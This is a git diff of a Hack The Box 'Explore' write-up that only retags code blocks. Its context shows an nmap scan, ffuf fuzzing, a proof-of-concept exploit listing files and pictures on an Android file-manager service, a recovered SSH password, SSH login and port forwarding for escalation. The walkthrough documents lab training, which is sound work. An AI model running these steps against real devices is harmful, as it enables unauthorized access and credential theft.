@@ -11,7 +11,7 @@ image: "/assets/img/explore/Explore.png"
 
 `nmap` finds 4 open `TCP` ports and 1 filtered `TCP` port.
 
-```nmap
+```console
 # Nmap 7.91 scan initiated Wed Oct 27 21:30:45 2021 as: nmap -p- -vvv -oA nmap/allports 10.10.10.247
 Increasing send delay for 10.10.10.247 from 0 to 5 due to 1423 out of 4743 dropped probes since last increase.
 Nmap scan report for explorer.htb (10.10.10.247)
@@ -100,7 +100,7 @@ The page returns an error message
 
 I will run `fuff` against the site and see what directories we can discover.
 
-```
+```console
 ffuf -u http://explorer.htb:59777/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200 -c
 
         /'___\  /'___\           /'___\
@@ -162,7 +162,7 @@ Bingo! now we are sure sdcard directory is present
 
 Lets `FUZZ` sdcard
 
-```
+```console
 george㉿kali)-[~/CTF/HTB/boxes/explore]
 └─$ ffuf -u http://explorer.htb:59777/sdcard/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200 -c
 
@@ -212,7 +212,7 @@ Checking the POC we can see some available commands. Lets try them out
 ![POC](/assets/img/explore/poc.png)
 
 Lets check the `listFiles`
-```lua
+```console
 ┌──(george㉿kali)-[~/CTF/HTB/boxes/explore]
 └─$ python3 poc.py --cmd listFiles --ip 10.10.10.247
 [*] Executing command: listFiles on 10.10.10.247
@@ -271,7 +271,7 @@ And we can read `listFIles`.
 
 ### Finding SSh credentials
 Enumerting this port further, I find `listPics` command to be most useful
-```lua
+```console
 (george㉿kali)-[~/CTF/HTB/boxes/explore]
 └─$ python3 poc.py --cmd listPics --ip 10.10.10.247
 [*] Executing command: listPics on 10.10.10.247
@@ -294,7 +294,7 @@ Eureka!! we have creds. -ooh kristi, you should really get a password manager.
 
 Lets try ssh on port `2222` using `kristi:Kr1sT!5h@Rp3xPl0r3!`
 
-```
+```console
 ┌──(george㉿kali)-[~/CTF/HTB/boxes/explore]
 └─$ ssh kristi@10.10.10.247 -p 2222
 Password authentication
@@ -306,12 +306,12 @@ Password:
 And we are in. Now lets get user flag.
 
 Digging around I found it in the sdcard directory
-```
+```console
 :/ $ ls sdcard
 Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt
 Android Download Music  Pictures      Ringtones dianxinos
 ```
-```
+```console
 :/ $ wc -c sdcard/user.txt
 33 sdcard/user.txt
 :/ $
@@ -320,7 +320,7 @@ Android Download Music  Pictures      Ringtones dianxinos
 ### Enumeration
 
 Checking what services are running on the box
-```
+```console
 :/ $ ss -tupln
 Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
 udp    UNCONN     0      0      0.0.0.0:49647              0.0.0.0:*
@@ -342,7 +342,7 @@ I see port `5555` open but did not show up on our nmap scans. Lets portfwd it an
 
 ### Port forward 5555
 
-```
+```console
 ┌──(george㉿kali)-[~/CTF/HTB]
 └─$ ssh -L 5555:127.0.0.1:5555 kristi@explorer.htb -p 2222                                                                                                                                                                                                            255 ⨯
 Password authentication
